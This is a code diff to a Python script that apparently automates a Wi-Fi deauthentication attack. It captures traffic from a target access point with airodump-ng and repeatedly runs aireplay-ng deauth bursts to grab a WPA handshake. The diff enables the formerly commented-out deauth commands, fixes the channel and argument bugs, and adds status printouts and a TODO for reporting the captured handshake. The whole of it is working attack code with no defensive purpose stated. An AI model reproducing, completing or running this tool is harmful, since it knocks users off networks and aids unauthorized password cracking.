@@ -261,17 +261,21 @@ def findTargetWash():
 def attack(target):
     # internal variables - BSSID, Channel, Name, & fileName
     BSSID = target[0]
-    Channel = target[2]
+    Channel = target[1]
     Name = target[3]
     fileName = 'capture_'+Name
     interface = getInterface(0)
 
     # Commands - airodump-ng: capture data & aireplay-ng: deauth network
     command_1 = ['airodump-ng','-K','1','-c',Channel,'--bssid',BSSID,'-w',fileName,'--output-format','cap',interface]
-    command_2 = ['aireplay-ng','--deauth',5,'-a',BSSID,interface]
+    command_2 = ['aireplay-ng','--deauth','5','-a',BSSID,interface]
 
-    process_1 = sp.Popen(command_1)
-    # process_2 = sp.run(command_2)
+    # print(command_1)
+
+    process_1 = sp.Popen(command_1, stdout=sp.DEVNULL)
+    print(Fore.YELLOW,'Listening...')
+    t.sleep(2)
+    sp.run(command_2, stdout=sp.DEVNULL)
     # process_2 = sp.Popen(command_2)
 
     t.sleep(2)
@@ -283,7 +287,7 @@ def attack(target):
     t.sleep(2)
     print(Fore.LIGHTGREEN_EX,'Attacking network...')
     t.sleep(2)
-    # sp.run(command_2)
+    sp.run(command_2)
     print(Fore.GREEN,'Attacking network...')
     t.sleep(2)
     print(Fore.CYAN,'Attacking network...')
@@ -294,7 +298,7 @@ def attack(target):
     t.sleep(2)
     print(Fore.GREEN,'Attacking network...')
     t.sleep(2)
-    # sp.run(command_2)
+    sp.run(command_2)
     print(Fore.LIGHTGREEN_EX,'Attacking network...')
     t.sleep(2)
     print(Fore.YELLOW,'Attacking network...')
@@ -304,6 +308,8 @@ def attack(target):
     print(Fore.RED,'Attacking network...')
     
     process_1.send_signal(signal.SIGINT)
+
+    # TODO: Add handshake captured printout
 
 
 def start():
